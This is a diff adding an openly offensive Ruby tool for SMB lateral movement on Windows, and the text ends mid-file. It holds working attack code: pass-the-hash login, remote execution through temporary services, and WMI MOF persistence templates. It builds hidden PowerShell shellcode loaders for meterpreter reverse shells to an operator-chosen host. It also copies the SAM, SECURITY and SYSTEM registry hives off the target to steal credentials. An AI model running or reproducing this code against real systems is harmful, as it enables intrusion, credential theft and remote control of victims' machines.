@@ -1,0 +1,1791 @@
+#!/usr/bin/env ruby
+#
+# Yet Another SMB PSEXEC Tool
+# By: Hood3dRob1n
+#
+# NOTE: gem install librex 
+# NOT 'rex', as 'librex' is the MSF version....
+#
+
+# PATH To Metasploit:
+# Leave MSFPATH='' Empty if you dont want MSF Assistance
+# Means no PowerShell Option if not...
+####### OPTIONAL ######## M
+MSFPATH=''              # S
+######################### F
+
+##### STD GEMS ####### P
+require 'base64'     # W
+require 'optparse'   # N
+require 'rubygems'   # S
+#### NON-STD GEMS #### A
+require 'colorize'   # U
+require 'readline'   # C
+require 'text-table' # E
+require 'rex'        ################# P
+require 'rex/proto/smb'              # W
+require 'rex/proto/ntlm'             # N
+require 'rex/proto/dcerpc'           # S
+require 'rex/encoder/ndr'            # A
+require 'rex/proto/smb/simpleclient' # U
+require './classes/smbclient-rb'     # C
+###################################### E
+
+######### BORROWED FROM MSF PSEXEC ############ W
+# SMB constants from Rex                      # H
+SIMPLE = Rex::Proto::SMB::SimpleClient        # Y
+XCEPT  = Rex::Proto::SMB::Exceptions          # 
+CONST  = Rex::Proto::SMB::Constants           # R
+                                              # E
+# Alias over the Rex DCERPC protocol modules  # I
+DCERPCPacket   = Rex::Proto::DCERPC::Packet   # N
+DCERPCClient   = Rex::Proto::DCERPC::Client   # V
+DCERPCResponse = Rex::Proto::DCERPC::Response # E
+DCERPCUUID     = Rex::Proto::DCERPC::UUID     # N
+NDR            = Rex::Encoder::NDR            # T
+############################################### ?
+
+# Home & Results Storage
+HOME = File.expand_path(File.dirname(__FILE__))
+RESULTS = HOME + '/results/'
+
+# Catch System Interupts
+trap("SIGINT") {puts "\n\nWARNING! CTRL+C Detected, Shutting things down".light_red + ".....\n\n".white; @smb.disconnect(@smbshare) if @smb; @socket.close if @socket; exit 666;}
+
+# Simple Banner
+def banner
+  puts
+  puts "Y".light_blue + ".".white + "A".light_blue + ".".white + "S".light_blue + ".".white + "P".light_blue
+  puts "By".light_blue + ": Hood3dRob1n".white
+  puts
+end
+
+# Clear Terminal
+def cls
+  if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
+    system('cls')
+  else
+    system('clear')
+  end
+end
+
+# Exec local command
+# Returns output as array
+def commandz(foo)
+  bar = IO.popen("#{foo}")
+  foobar = bar.readlines
+  return foobar
+end
+
+# Execute commands in separate process
+# Will be leveraged to spawn new X-term windows for stuff
+def fireNforget(command)
+  pid = Process.fork
+  if pid.nil?
+    sleep(1)
+    exec "#{command}"
+  else
+    Process.detach(pid)
+  end
+end
+
+# Generate a random aplha string length of value of num
+def randz(num)
+  (0...num).map{ ('a'..'z').to_a[rand(26)] }.join
+end
+
+
+# Local OS shell to run commands on fly
+def local_os_shell
+  cls
+  banner
+  prompt = "(Local)> "
+  while line = Readline.readline("#{prompt}", true)
+    cmd = line.chomp
+    case cmd
+    when /^exit$|^quit$|^back$/i
+      puts "OK, Returning to Main Menu".light_red + "....".white
+      break
+    else
+      begin
+        rez = commandz(cmd) #Run command passed
+        puts "#{rez.join}".cyan #print results nicely for user....
+      rescue Errno::ENOENT => e
+        puts "#{e}".light_red
+      rescue => e
+        puts "#{e}".light_red
+      end
+    end
+  end
+end
+
+# Ruby Eval() Console for testing ruby shit on the fly.....
+def rubyme(code)
+  begin
+    puts "#{eval("#{code}")}".cyan
+  rescue NoMethodError => e
+    puts "#{e}".light_red
+  rescue NameError => e
+    puts "#{e}".light_red
+  rescue SyntaxError => e
+    puts "#{e}".light_red
+  rescue TypeError => e
+    puts "#{e}".light_red
+  end
+end
+
+# Simple .MOF Template to run our CMD after autocompiled
+# Modded JSCRIPT MOF based on PHP Exploit I found on a server (unknown author)
+def generate_cmd_mof(cmd)
+  mof = "#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = \"Root\\\\Cimv2\";
+Name  = \"filtP2\";
+Query = \"Select * From __InstanceModificationEvent \"
+   \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \"
+   \"And TargetInstance.Second = 5\";
+QueryLanguage = \"WQL\";
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = \"consPCSV2\";
+ScriptingEngine = \"JScript\";
+ScriptText =
+\"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"#{cmd}\\\")\";
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};";
+  return mof
+end
+
+# Borrowed from MSF
+# Simple .MOF Template
+# Will run our EXE Payload when autocompiled
+def generate_exe_mof(mofname, exe)
+  mof = <<-EOT
+#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
+class MyClass@CLASS@
+{
+  	[key] string Name;
+};
+class ActiveScriptEventConsumer : __EventConsumer
+{
+ 	[key] string Name;
+  	[not_null] string ScriptingEngine;
+  	string ScriptFileName;
+  	[template] string ScriptText;
+  uint32 KillTimeout;
+};
+instance of __Win32Provider as $P
+{
+    Name  = "ActiveScriptEventConsumer";
+    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
+    PerUserInitialization = TRUE;
+};
+instance of __EventConsumerProviderRegistration
+{
+  Provider = $P;
+  ConsumerClassNames = {"ActiveScriptEventConsumer"};
+};
+Instance of ActiveScriptEventConsumer as $cons
+{
+  Name = "ASEC";
+  ScriptingEngine = "JScript";
+  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";
+
+};
+Instance of ActiveScriptEventConsumer as $cons2
+{
+  Name = "qndASEC";
+  ScriptingEngine = "JScript";
+  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\#{mofname}\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
+};
+instance of __EventFilter as $Filt
+{
+  Name = "instfilt";
+  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass@CLASS@\\"";
+  QueryLanguage = "WQL";
+};
+instance of __EventFilter as $Filt2
+{
+  Name = "qndfilt";
+  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";
+  QueryLanguage = "WQL";
+
+};
+instance of __FilterToConsumerBinding as $bind
+{
+  Consumer = $cons;
+  Filter = $Filt;
+};
+instance of __FilterToConsumerBinding as $bind2
+{
+  Consumer = $cons2;
+  Filter = $Filt2;
+};
+instance of MyClass@CLASS@ as $MyClass
+{
+  Name = "ClassConsumer";
+};
+EOT
+  classname = rand(0xffff).to_s
+  mof.gsub!(/@CLASS@/, classname)
+  mof.gsub!(/@EXE@/, exe)
+  return mof
+end
+
+# Preps and Builds our PowerShell Command
+# Pass in the finishing string to our MSFVENOM payload builder to initiate
+# MSF builds payload, we cut out the shellcode from output
+# Then convert to powershell format and ready for launch
+# Returns a powershell command ready to be run however you can
+def powershell_builder(venomstring)
+  if File.exists?("#{MSFPATH}msfvenom")
+    # venomstring should be the arguments needed for msfvenom to build the base payload/shellcode ('-p <payload> LHOST=<ip> LPORT=<port>'
+    shellcode="#{`#{MSFPATH}msfvenom #{venomstring} -b \\x00`}".gsub(";", "").gsub(" ", "").gsub("+", "").gsub('"', "").gsub("\n", "").gsub('buf=','').strip.gsub('\\',',0').sub(',', '')
+    #	=> yields a variable holding our escapped shellcode with ',' between each char.....
+
+     puts "[".light_blue + "*".white + "]".light_blue + " Converting Base ShellCode to PowerShell friendly format.....".white
+    # Borrowed from one of several appearances across the many Python written scripts....
+    ps_base = "$code = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };"
+    # => Our base PowerShell wrapper to get the job done now in var
+    # => place our shellcode in the placeholders
+    ps_base_cmd = ps_base.sub('%s', shellcode) 
+    # Prep it for final stages and put in funky ps format....
+    ps_cmd_prepped=String.new
+    ps_base_cmd.scan(/./) {|char| ps_cmd_prepped += char + "\x00" }
+
+    # Base64 Encode our Payload so it is primed & ready for PowerShell usage
+    stager = Base64.encode64("#{ps_cmd_prepped}")
+
+    # The magic is now ready!
+    ps_cmd = 'powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand ' + stager.gsub("\n", '')
+    return ps_cmd
+  else
+    puts "[".light_red + "*".white + "]".light_red + " Can't find MSFVENOM to build payloads!".white
+    puts "[".light_red + "*".white + "]".light_red + " Check or provide MSF Path in source to correct......".white
+    return nil
+  end
+end
+
+
+# Configure Connection Credentials
+def cred_config
+  puts "Connection Credentials Configurator".light_blue.underline + ": ".white
+  line = Readline.readline("(Target)> ", true)
+  @target = line.chomp
+  line = Readline.readline("(Set Hostname (Y/N)?)> ", true)
+  answer = line.chomp
+  if answer.upcase == 'Y' or answer.upcase == 'YES'
+    line = Readline.readline("(Hostname)> ", true)
+    @hostname = line.chomp
+  else
+    @hostname='*SMBSERVER'
+  end
+  line = Readline.readline("(Use SMB Port 139 (Y/N)?)> ", true)
+  answer = line.chomp
+  if answer.upcase == 'N' or answer.upcase == 'NO'
+    line = Readline.readline("(SMB Port)> ", true)
+    @port = line.chomp.to_i
+  else
+    @port=139
+  end
+  line = Readline.readline("(Username)> ", true)
+  @user = line.chomp
+  line = Readline.readline("(Password)> ", true)
+  @pass = line.chomp
+  line = Readline.readline("(Is Password a Hash (Y/N)?)> ", true)
+  answer = line.chomp
+  if answer.upcase == 'Y' or answer.upcase == 'YES'
+    @hashpass=true
+    if @pass =~ /(^0{32}):/
+      @padded=true # SMBCLIENT Doesn't need the padding so will remove later if needed
+    else
+      @padded=false
+    end
+  else
+    @hashpass=false
+  end
+  line = Readline.readline("(Set Domain Value (Y/N)?)> ", true)
+  answer = line.chomp
+  if answer.upcase == 'Y' or answer.upcase == 'YES'
+    line = Readline.readline("(Domain)> ", true)
+    @domain=line.chomp
+  else
+    @domain='.'
+  end
+  puts
+  puts "Validating provided info works, hang tight".light_blue + ".....".white
+  if smb_cred_check(@target,@port,@user,@pass,@domain, @hostname)
+    @smbclient = RubySmbClient.new(@target,@port.to_i, 'C$', @user,@pass,@domain, @hashpass)
+    @socket = Rex::Socket.create_tcp({ 'PeerHost' => @target, 'PeerPort' => @port.to_i })
+    @smb = Rex::Proto::SMB::SimpleClient.new(@socket, @port.to_i == 445)
+    @smb.login(@hostname,@user,@pass,@domain)
+    @smbshare='C$'
+    puts "w00t - Credentials Configured & Working".light_green + "!".white
+    @working=true
+    begin
+      cmd1 = "echo %TEMP%"
+      text = "C:\\\\#{Rex::Text.rand_text_alpha(16)}.txt"
+      bat  = "C:\\\\#{Rex::Text.rand_text_alpha(16)}.bat"
+      cmdexec = "%COMSPEC% /C echo #{cmd1} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+      smb_psexec(cmdexec, false)
+      tmp = get_output(text, false) # Use this to expand %TEMP% so we know where to write to....
+      @tmp=tmp.strip.chomp
+      files = [ text, bat ]
+      cleanup_after(files, false)
+    rescue => e
+      # Failed to find out %TEMP%, ask user for writable location...
+      puts "#{e}".light_red
+      @tmp=nil
+    end
+  else
+    puts
+    puts "Re-configure and try again or check network conditions".light_red + "....".white
+    puts
+    @working=false
+  end
+end
+
+# Return the current configrued credentials
+def credz
+  return @target, @port, @user, @pass, @domain, @hashpass, @hostname
+end
+
+# DCERPC Request Handle
+# Borrowed from MSF PSEXEC
+def dcerpc_handle(uuid, version, protocol, opts, rhost)
+  Rex::Proto::DCERPC::Handle.new([uuid, version], protocol, rhost, opts)
+end
+
+# DCERPC Session Bind
+# Borrowed from MSF PSEXEC
+def dcerpc_bind(handle, csocket, csimple, cuser, cpass)
+  opts = { }
+  opts['connect_timeout'] = 10
+  opts['read_timeout']    = 10
+  opts['smb_user'] = cuser
+  opts['smb_pass'] = cpass
+  opts['frag_size'] = 512
+  opts['smb_client'] = csimple
+  Rex::Proto::DCERPC::Client.new(handle, csocket, opts)
+end
+
+# Actual DCERPC Call
+# Borrowed from MSF PSEXEC
+def dcerpc_call(function, stub = '', timeout=nil, do_recv=true)
+  otimeout = dcerpc.options['read_timeout']
+  begin
+    dcerpc.options['read_timeout'] = timeout if timeout
+    dcerpc.call(function, stub, do_recv)
+  rescue ::Rex::Proto::SMB::Exceptions::NoReply, Rex::Proto::DCERPC::Exceptions::NoResponse
+    puts "The DCERPC service did not reply to our request".light_red + "!".white
+    return
+  ensure
+    dcerpc.options['read_timeout'] = otimeout
+  end
+end
+
+# Check if you have valid SMB credentials
+# Returns true on success, false otherwise
+# NOTE: Newer Windows need the hostname of target to connect (w7, 2k8, ?)
+def smb_cred_check(host, port=445, user='Administrator', passorhash=nil, domain='.', hostname='*SMBSERVER')
+  begin
+    socket = Rex::Socket.create_tcp({ 'PeerHost' => host, 'PeerPort' => port.to_i })
+    smb = Rex::Proto::SMB::SimpleClient.new(socket, port.to_i == 445)
+    smb.login(hostname,user,passorhash,domain)
+    smb.connect("\\\\#{host}\\IPC$")
+    if (not smb.client.auth_user)
+      auth=false
+    else
+      auth=true
+    end
+    socket.close
+    return auth
+  rescue => e
+    puts "Error Connecting to #{host}".light_red + "!".white
+    if @hashpass and "#{e}" =~ /STATUS_LOGON_FAILURE \(Command=115 WordCount=0\)/
+      puts "Make sure your hash format meets requirements".light_yellow + "!".white
+      puts "If NTLM Hash Only, Pad with x32 0's".light_yellow + ": 00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c".white
+      puts "Otherwise".light_yellow + ": e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c".white
+    else
+      puts "\t=> ".white + "#{e}".light_red
+    end
+    return false
+  end
+end
+
+# Scan Class C Block
+# Returns OS Results for Hosts who respond
+# Results also saved to: smb_os_discovery.txt (overwritten each run)
+def smb_os_discovery
+  puts "SMB OS Discovery Scanner".light_blue
+  puts 
+  puts "Provide Class C Network Prefix to Scan".light_blue + ": ".white
+  puts "EX".light_blue + ": 192.168.1".white
+  puts
+  line = Readline.readline("(Network)> ", true)
+  network = line.chomp
+  puts
+  puts "Running SMB OS Discovery Scan against".light_blue + ": #{network}.1-254"
+  f = File.open(RESULTS + 'smb_os_discovery.txt', 'w+')
+  (1..254).each do |num|
+    os=''
+    client = RubySmbClient.new("#{network}.#{num}")
+    info = client.os_discovery
+    if info[0]
+      puts
+      f.puts "[*] Host: #{network}.#{num}, OS: #{info[1]}, DOMAIN: #{info[2]}"
+      puts "[".light_green + "*".white + "]".light_green + " Host: #{network}.#{num}, OS: #{info[1]}, DOMAIN: #{info[2]}".white
+    else
+      print "\r[".light_red + "*".white + "]".light_red + " Host: #{network}.#{num}".white
+    end
+  end
+  puts
+  f.puts
+  f.close
+  puts "SMB OS Discovery Scan Complete".light_blue + "!".white
+  puts "Check '#{RESULTS + 'smb_os_discovery.txt'}' for logged results".light_yellow + ".....".white
+  puts
+end
+
+# Check if File Exists and Can be opened
+# Borrowed from MSF SMB Module
+def smb_file_exist?(file)
+  begin
+    fd = @smb.open(file, 'ro')
+  rescue XCEPT::ErrorCode => e
+    # If attempting to open the file results in a "*_NOT_FOUND" error,
+    # then we can be sure the file is not there.
+    #
+    # Copy-pasted from smb/exceptions.rb to avoid the gymnastics
+    # required to pull them out of a giant inverted hash
+    #
+    # 0xC0000034 => "STATUS_OBJECT_NAME_NOT_FOUND",
+    # 0xC000003A => "STATUS_OBJECT_PATH_NOT_FOUND",
+    # 0xC0000225 => "STATUS_NOT_FOUND",
+    error_is_not_found = [ 0xC0000034, 0xC000003A, 0xC0000225 ].include?(e.error_code)
+    # If the server returns some other error, then there was a
+    # permissions problem or some other difficulty that we can't
+    # really account for and hope the caller can deal with it.
+    raise e unless error_is_not_found
+    found = !error_is_not_found
+  else
+    # There was no exception, so we know the file is openable
+    fd.close
+    found = true
+  end
+  found
+end
+
+# Read File over SMB
+# Borrowed from PSEXEC Module
+def smb_read_file(smbshare, file)
+  begin
+    @smb.connect("\\\\#{@target}\\#{smbshare}")
+    file = @smb.open(file.sub('C:', ''), 'ro')
+    contents = file.read
+    file.close
+    @smb.disconnect("\\\\#{@target}\\#{smbshare}")
+    return contents
+  rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
+    puts "#{@target} - Unable to read file #{file}. #{e.class}: #{e}.".light_red
+    return nil
+  end
+end
+
+# Read Binary File over SMB
+# Need to open in binary mode
+# Needed for things like Registry hive files....
+def smb_read_bin_file(smbshare, rfile)
+  begin
+    @smb.connect("\\\\#{@target}\\#{smbshare}")
+    file = @smb.open(rfile.sub('C:', ''), 'orb')
+    bin_content = file.read
+    file.close
+    @smb.disconnect("\\\\#{@target}\\#{smbshare}")
+    return bin_content
+  rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
+    print_error("#{@target} - Unable to read file #{file}. #{e.class}: #{e}.")
+    return nil
+  end
+end
+
+# Remove remote file
+# Borrowed from MSF SMB Module
+def smb_file_rm(file)
+  fd = smb_open(file, 'ro')
+  fd.delete
+end
+
+# Borrowed from MSF SMB Module
+# the default chunk size of 48000 for OpenFile is not compatible when signing is enabled (and with some nt4 implementations)
+# cause it looks like MS windows refuse to sign big packet and send STATUS_ACCESS_DENIED
+# fd.chunk_size = 500 is better
+def smb_open(path, perm)
+  @smb.open(path, perm, 500)
+end
+
+# Run a Single Command or Service Binary
+# Borrowed from MSF PSEXEC Module
+# Pass in command to execute
+# OR
+# Pass in path to binary to run
+# Returns True on success, false otherwise
+def smb_psexec(cmdorfile, verbose=true)
+  begin
+    @smb.connect("\\\\#{@target}\\IPC$")
+    handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"], @target)
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Binding to #{handle} ...".white if verbose
+    dcerpc = dcerpc_bind(handle,@socket, @smb, @user, @pass)
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Bound to #{handle} ...".white if verbose
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Obtaining a service manager handle...".white if verbose
+    scm_handle = nil
+    stubdata = NDR.uwstring("\\\\#{@target}") + NDR.long(0) + NDR.long(0xF003F)
+    begin
+      response = dcerpc.call(0x0f, stubdata)
+      if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
+        scm_handle = dcerpc.last_response.stub_data[0,20]
+      end
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " #{@target} - Error getting scm handle: #{e}".white
+      return false
+    end
+    servicename = Rex::Text.rand_text_alpha(11)
+    displayname = Rex::Text.rand_text_alpha(16)
+    holdhandle = scm_handle
+    svc_handle = nil
+    svc_status = nil
+    stubdata =
+      scm_handle + NDR.wstring(servicename) + NDR.uwstring(displayname) +
+      NDR.long(0x0F01FF) + # Access: MAX
+      NDR.long(0x00000110) + # Type: Interactive, Own process
+      NDR.long(0x00000003) + # Start: Demand
+      NDR.long(0x00000000) + # Errors: Ignore
+      NDR.wstring( cmdorfile ) +
+      NDR.long(0) + # LoadOrderGroup
+      NDR.long(0) + # Dependencies
+      NDR.long(0) + # Service Start
+      NDR.long(0) + # Password
+      NDR.long(0) + # Password
+      NDR.long(0) + # Password
+      NDR.long(0) # Password
+    begin
+      puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Creating the service...".white if verbose
+      response = dcerpc.call(0x0c, stubdata)
+      if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
+        svc_handle = dcerpc.last_response.stub_data[0,20]
+        svc_status = dcerpc.last_response.stub_data[24,4]
+      end
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " #{@target} - Error creating service: #{e}".white
+      return false
+    end
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Closing service handle...".white if verbose
+    begin
+      response = dcerpc.call(0x0, svc_handle)
+    rescue ::Exception
+    end
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Opening service...".white if verbose
+    begin
+      stubdata = scm_handle + NDR.wstring(servicename) + NDR.long(0xF01FF)
+      response = dcerpc.call(0x10, stubdata)
+      if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
+        svc_handle = dcerpc.last_response.stub_data[0,20]
+      end
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " #{@target} - Error opening service: #{e}".white
+      return false
+    end
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Starting the service...".white if verbose
+    stubdata = svc_handle + NDR.long(0) + NDR.long(0)
+    begin
+      response = dcerpc.call(0x13, stubdata)
+      if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
+      end
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " #{@target} - Error starting service: #{e}".white
+      return false
+    end
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Removing the service...".white if verbose
+    stubdata = svc_handle
+    begin
+      response = dcerpc.call(0x02, stubdata)
+      if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
+      end
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " #{@target} - Error removing service: #{e}".white
+    end
+    puts "[".light_blue + "*".white + "]".light_blue + " #{@target} - Closing service handle...".white if verbose
+    begin
+      response = dcerpc.call(0x0, svc_handle)
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " #{@target} - Error closing service handle: #{e}".white
+    end
+    select(nil, nil, nil, 1.0)
+    @smb.disconnect("\\\\#{@target}\\IPC$")
+    return true
+  rescue Rex::Proto::SMB::Exceptions::InvalidCommand
+    puts "[".light_red + "*".white + "]".light_red + " #{@target} - Network static causing issues, going to retry....".white
+    smb_psexec(cmdorfile, verbose)
+  end
+end
+
+# Retrive output from command
+# Borrowed from MSF SMB PSEXEC
+def get_output(file, verbose=true)
+  begin
+    output = smb_read_file(@smbshare, file.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', ''))
+  rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
+    puts "[".light_red + "*".white + "]".light_red + " Error getting command output. #{$!.class}. #{$!}." if verbose
+    return
+  end
+  if output.nil?
+    puts "[".light_red + "*".white + "]".light_red + " Error getting command output. #{$!.class}. #{$!}." if verbose
+    return
+  end
+  if output.empty?
+    puts "[".light_yellow + "*".white + "]".light_yellow + " Command finished with no output".white if verbose
+    return
+  end
+  puts "\n#{output}".cyan  if verbose
+  return output
+end
+
+# Removes files created during execution.
+def cleanup_after(files, verbose=true)
+  begin
+    @smb.connect("\\\\#{@target}\\#{@smbshare}")
+    files.each do |file|
+      begin
+        if smb_file_exist?(file.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+          smb_file_rm(file.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+        end
+      rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
+        puts "[".light_red + "*".white + "]".light_red + " Unable to cleanup #{file}. Error: #{cleanuperror}" if verbose
+      end
+    end
+    left = files.collect{ |f| smb_file_exist?(f.sub('C:', '')) }
+    if left.any?
+      puts "[".light_red + "*".white + "]".light_red + " Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target....".white if verbose
+    else
+      puts "[".light_green + "*".white + "]".light_green + " Cleanup was successful!" if verbose
+    end
+    @smb.disconnect("\\\\#{@target}\\#{@smbshare}")
+  rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
+    puts "[".light_red + "*".white + "]".light_red + " Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target....".white if verbose
+  end
+end
+
+
+# Identify MSF Payload to use
+# Build with MSFVENOM
+# Convert to PowerShell ShellCode
+# Run via psexec
+def power_shell_hell
+  if MSFPATH.nil? or MSFPATH == ''
+    puts "[".light_red + "*".white + "]".light_red + " MSF Path not provided, can't use this option without it!".white
+    puts "[".light_red + "*".white + "]".light_red + " Check the source for where to edit to enable....".white
+    puts
+  else
+    puts "Windows Powershell Payload Builder".white.underline
+    puts
+    line = Readline.readline("(IP for PowerShell Reverse Payload)> ", true)
+    zIP = line.chomp
+    line = Readline.readline("(PORT for PowerShell Reverse Payload)> ", true)
+    zPORT = line.chomp
+    winz = { 
+      '1' => 'windows/meterpreter/reverse_http',
+      '2' => 'windows/meterpreter/reverse_tcp',
+      '3' => 'windows/shell/reverse_tcp',
+      '4' => 'windows/shell/reverse_http',
+      '5' => 'windows/x64/meterpreter/reverse_https',
+      '6' => 'windows/x64/meterpreter/reverse_tcp',
+      '7' => 'windows/x64/shell/reverse_tcp'
+    }
+    while(true)
+      puts "Select Payload".light_yellow + ": ".white
+      winz.each { |x,y| puts "#{x}) ".white + "#{y}".light_yellow }
+      answer=gets.chomp
+      if answer.to_i > 0 and answer.to_i <= 7
+        payload=winz["#{answer.to_i}"]
+        break
+      end
+    end
+    puts "[".light_blue + "*".white + "]".light_blue + "Generating Base ShellCode for Payload.....".white
+    # Preps and Builds our PowerShell Command to run
+    ps_cmd = powershell_builder("-p #{payload} LHOST=#{zIP} LPORT=#{zPORT}")
+    if @tmp.nil?
+      # Failed to find out %TEMP%, ask user for writable location...
+      puts "Provide a writable location for temporary storage, like".light_yellow + ": C:\\\\\\\\WINDOWS\\\\Temp".white
+      line = Readline.readline("(Temp Path to use)> ", true)
+      tmp = line.chomp
+      puts
+    else
+      tmp=@tmp
+    end
+    puts "[".light_yellow + "*".white + "]".light_yellow + " Make sure listener is ready if needed.....".white
+    puts "[".light_blue + "*".white + "]".light_blue + " Attempting to run PowerShell payload on target.....".white
+    sleep(3)
+    text = "#{tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{ps_cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+    smb_psexec(cmdexec)
+    files=[text, bat]
+    cleanup_after(files, false)
+  end
+end
+
+# Backup Main Registry HIves
+# Provide Temp dir on target to use for storage
+def make_reg_backups(tmp)
+  commandz = { 'SYSTEM' => "%COMSPEC% /C reg.exe save HKLM\\SYSTEM #{tmp}\\sys", 'SECURITY' => "%COMSPEC% /C reg.exe save HKLM\\SECURITY #{tmp}\\sec", 'SAM' => "%COMSPEC% /C reg.exe save HKLM\\SAM #{tmp}\\sam", 'SOFTWARE' => "%COMSPEC% /C reg.exe save HKLM\\SOFTWARE #{tmp}\\sw" }
+  commandz.each do |hive, cmd|
+    puts "[".light_blue + "*".white + "]".light_blue + " Copying #{hive} hive.....".white
+    begin
+      smb_psexec(cmd, false)
+      sleep(1) # Slight pause between backup runs
+    rescue StandardError => hiveerror
+      puts "[".light_red + "*".white + "]".light_red + " Problems making copy of #{hive} hive".light_red + ": #{hiveerror}".white
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " Problems making copy of #{hive} hive".light_red + ": #{hiveerror}".white
+    end
+  end
+end
+
+# Download the Hive Copies we made
+def download_hives(arrayofhives)
+  Dir.mkdir(RESULTS + @target + '/') unless File.exists?(RESULTS + @target + '/') and File.directory?(RESULTS + @target + '/')
+  arrayofhives.each do |hive|
+    file = hive.to_s.split("\\")[-1] if hive =~ /\\/
+    file = hive.to_s.split("\\\\")[-1] if hive =~ /\\\\/
+    puts "[".light_blue + "*".white + "]".light_blue + " Downloading #{hive} to #{RESULTS}#{@target}/#{file}.....".white
+    begin
+      @smb.connect("\\\\#{@target}\\#{@smbshare}")
+      funk = @smb.open("#{hive.sub(/c:\\\\/i, '').sub(/c:\\/i, '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\')}", 'orb')
+      data = funk.read
+      funk.close
+      f = File.open("#{RESULTS}#{@target}/#{file}", 'wb')
+      f.write(data)
+      f.close
+      @smb.disconnect("\\\\#{@target}\\#{@smbshare}")
+    rescue ::Exception => e
+      puts "[".light_red + "*".white + "]".light_red + " Error downloading #{hive} hive: #{e}".white
+    end
+  end
+end
+
+# Check if UAC is enabled or not
+def check_uac(verbose=true)
